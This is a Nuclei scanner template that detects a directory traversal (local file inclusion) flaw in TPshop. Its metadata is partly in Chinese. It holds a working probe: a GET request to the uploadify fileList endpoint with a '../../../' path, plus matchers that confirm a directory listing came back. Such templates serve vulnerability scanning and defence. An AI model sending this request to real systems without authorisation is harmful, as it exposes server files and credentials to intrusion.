id: tpshop-directory-traversal

info:
  name: TPshop - 本地文件包含漏洞
  author: pikpikcu
  severity: high
  description: TPshop - 本地文件包含 存在本地文件包含漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  reference:
    - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: tpshop,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"state":"SUCCESS"'

      - type: status
        status:
          - 200
